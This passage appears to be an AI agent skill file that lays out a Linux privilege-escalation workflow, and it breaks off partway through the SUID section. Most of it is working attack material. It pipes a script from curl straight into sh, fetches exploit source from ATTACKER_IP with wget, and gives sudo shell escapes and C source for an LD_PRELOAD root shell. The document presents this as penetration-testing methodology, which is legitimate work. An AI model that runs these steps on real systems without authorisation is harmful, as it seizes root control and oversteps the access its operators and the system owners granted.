---
name: Linux Privilege Escalation
description: This skill should be used when the user asks to "escalate privileges on Linux", "find privesc vectors on Linux systems", "exploit sudo misconfigurations", "abuse SUID binaries", "exploit cron jobs for
category: Security & Systems
source: antigravity
tags: [python, ai, workflow, document, security, vulnerability, cro]
url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/linux-privilege-escalation
---


# Linux Privilege Escalation

## Purpose

Execute systematic privilege escalation assessments on Linux systems to identify and exploit misconfigurations, vulnerable services, and security weaknesses that allow elevation from low-privilege user access to root-level control. This skill enables comprehensive enumeration and exploitation of kernel vulnerabilities, sudo misconfigurations, SUID binaries, cron jobs, capabilities, PATH hijacking, and NFS weaknesses.

## Inputs / Prerequisites

### Required Access
- Low-privilege shell access to target Linux system
- Ability to execute commands (interactive or semi-interactive shell)
- Network access for reverse shell connections (if needed)
- Attacker machine for payload hosting and receiving shells

### Technical Requirements
- Understanding of Linux filesystem permissions and ownership
- Familiarity with common Linux utilities and scripting
- Knowledge of kernel versions and associated vulnerabilities
- Basic understanding of compilation (gcc) for custom exploits

### Recommended Tools
- LinPEAS, LinEnum, or Linux Smart Enumeration scripts
- Linux Exploit Suggester (LES)
- GTFOBins reference for binary exploitation
- John the Ripper or Hashcat for password cracking
- Netcat or similar for reverse shells

## Outputs / Deliverables

### Primary Outputs
- Root shell access on target system
- Privilege escalation path documentation
- System enumeration findings report
- Recommendations for remediation

### Evidence Artifacts
- Screenshots of successful privilege escalation
- Command output logs demonstrating root access
- Identified vulnerability details
- Exploited configuration files

## Core Workflow

### Phase 1: System Enumeration

#### Basic System Information
Gather fundamental system details for vulnerability research:

```bash
# Hostname and system role
hostname

# Kernel version and architecture
uname -a

# Detailed kernel information
cat /proc/version

# Operating system details
cat /etc/issue
cat /etc/*-release

# Architecture
arch
```

#### User and Permission Enumeration

```bash
# Current user context
whoami
id

# Users with login shells
cat /etc/passwd | grep -v nologin | grep -v false

# Users with home directories
cat /etc/passwd | grep home

# Group memberships
groups

# Other logged-in users
w
who
```

#### Network Information

```bash
# Network interfaces
ifconfig
ip addr

# Routing table
ip route

# Active connections
netstat -antup
ss -tulpn

# Listening services
netstat -l
```

#### Process and Service Enumeration

```bash
# All running processes
ps aux
ps -ef

# Process tree view
ps axjf

# Services running as root
ps aux | grep root
```

#### Environment Variables

```bash
# Full environment
env

# PATH variable (for hijacking)
echo $PATH
```

### Phase 2: Automated Enumeration

Deploy automated scripts for comprehensive enumeration:

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# Linux Smart Enumeration
./lse.sh -l 1

# Linux Exploit Suggester
./les.sh
```

Transfer scripts to target system:

```bash
# On attacker machine
python3 -m http.server 8000

# On target machine
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Phase 3: Kernel Exploits

#### Identify Kernel Version

```bash
uname -r
cat /proc/version
```

#### Search for Exploits

```bash
# Use Linux Exploit Suggester
./linux-exploit-suggester.sh

# Manual search on exploit-db
searchsploit linux kernel [version]
```

#### Common Kernel Exploits

| Kernel Version | Exploit | CVE |
|---------------|---------|-----|
| 2.6.x - 3.x | Dirty COW | CVE-2016-5195 |
| 4.4.x - 4.13.x | Double Fetch | CVE-2017-16995 |
| 5.8+ | Dirty Pipe | CVE-2022-0847 |

#### Compile and Execute

```bash
# Transfer exploit source
wget http://ATTACKER_IP/exploit.c

# Compile on target
gcc exploit.c -o exploit

# Execute
./exploit
```

### Phase 4: Sudo Exploitation

#### Enumerate Sudo Privileges

```bash
sudo -l
```

#### GTFOBins Sudo Exploitation
Reference https://gtfobins.github.io for exploitation commands:

```bash
# Example: vim with sudo
sudo vim -c ':!/bin/bash'

# Example: find with sudo
sudo find . -exec /bin/sh \; -quit

# Example: awk with sudo
sudo awk 'BEGIN {system("/bin/bash")}'

# Example: python with sudo
sudo python -c 'import os; os.system("/bin/bash")'

# Example: less with sudo
sudo less /etc/passwd
!/bin/bash
```

#### LD_PRELOAD Exploitation
When env_keep includes LD_PRELOAD:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
# Compile shared library
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# Execute with sudo
sudo LD_PRELOAD=/tmp/shell.so find
```

### Phase 5: SUID Binary Exploitation

#### Find SUID Binaries

```bash
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

#### Exp
